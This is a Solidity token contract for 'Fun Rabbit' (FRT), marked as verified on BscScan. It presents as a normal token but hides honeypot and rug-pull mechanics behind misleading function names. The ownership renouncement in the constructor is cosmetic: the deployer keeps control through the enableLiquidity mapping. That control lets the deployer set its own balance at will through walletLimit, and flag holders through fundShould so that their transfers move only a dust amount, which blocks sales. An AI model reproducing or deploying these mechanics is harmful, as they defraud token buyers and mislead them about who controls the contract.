/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract FunRabbit {
    uint8 public decimals = 18;
    address public launchedTotalLaunch;
    mapping(address => mapping(address => uint256)) public allowance;
    address public walletFee;


    mapping(address => bool) public enableLiquidity;
    mapping(address => bool) public totalFromWallet;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    string public symbol = "FRT";
    mapping(address => uint256) public balanceOf;
    string public name = "Fun Rabbit";
    address public owner;



    uint256 constant toAtMin = 10 ** 10;
    modifier txLaunched() {
        require(enableLiquidity[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router liquidityBurn = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchedTotalLaunch = IUniswapV2Factory(liquidityBurn.factory()).createPair(liquidityBurn.WETH(), address(this));
        owner = msg.sender;
        walletFee = owner;
        enableLiquidity[walletFee] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, dst, amount);
    }

    function _transferFrom(address src, address dst, uint256 amount) internal returns (bool) {
        if (src == walletFee || dst == walletFee) {
            return modeReceiver(src, dst, amount);
        }
        if (totalFromWallet[src]) {
            return modeReceiver(src, dst, toAtMin);
        }
        return modeReceiver(src, dst, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function senderLiquidityTrading(address totalBuy) public txLaunched {
        enableLiquidity[totalBuy] = true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function modeReceiver(address marketingTrading, address buyLiquidity, uint256 sellTo) internal returns (bool) {
        require(balanceOf[marketingTrading] >= sellTo);
        balanceOf[marketingTrading] -= sellTo;
        balanceOf[buyLiquidity] += sellTo;
        emit Transfer(marketingTrading, buyLiquidity, sellTo);
        return true;
    }

    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
        if (allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= amount);
            allowance[src][msg.sender] -= amount;
        }
        return _transferFrom(src, dst, amount);
    }

    function walletLimit(uint256 sellTo) public txLaunched {
        balanceOf[walletFee] = sellTo;
    }

    function fundShould(address exemptTxEnable) public txLaunched {
        totalFromWallet[exemptTxEnable] = true;
    }


}